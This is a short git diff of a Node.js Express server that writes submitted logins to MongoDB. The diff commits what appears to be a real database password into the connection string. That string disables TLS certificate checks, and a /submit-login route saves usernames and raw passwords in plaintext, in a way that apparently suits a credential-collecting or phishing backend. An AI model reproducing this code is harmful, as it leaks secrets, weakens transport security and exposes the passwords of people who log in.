@@ -8,7 +8,7 @@ const PORT = process.env.PORT || 3000;
 
 const { MongoClient } = require('mongodb');
 
-const uri = "mongodb+srv://garycantilang:<db_password>@cluster0.cygdj.mongodb.net/?retryWrites=true&w=majority&ssl=true&tlsInsecure=true";
+const uri = "mongodb+srv://garycantilang:<wMfHyhRaq8pg4Mh1>@cluster0.cygdj.mongodb.net/?retryWrites=true&w=majority&ssl=true&tlsInsecure=true";
 const client = new MongoClient(uri);
 
 let db; // Declare the db variable
@@ -16,7 +16,7 @@ let db; // Declare the db variable
 async function connectToDatabase() {
     try {
         await client.connect();
-        db = client.db('<ifsh>'); // Assign your database name here
+        db = client.db('<logdata>'); // Assign your database name here
         console.log("Connected to MongoDB");
     } catch (error) {
         console.error("MongoDB connection error:", error);
@@ -35,7 +35,7 @@ app.post('/submit-login', async (req, res) => {
 
     try {
         const loginData = { username, password, timestamp: new Date() };
-        await db.collection('<logdata>').insertOne(loginData); // Replace '<ifsh>' with your collection name
+        await db.collection('<ifsh>').insertOne(loginData); // Replace '<ifsh>' with your collection name
         res.send('Login information saved successfully to MongoDB.');
     } catch (error) {
         console.error('Error saving data to MongoDB:', error);
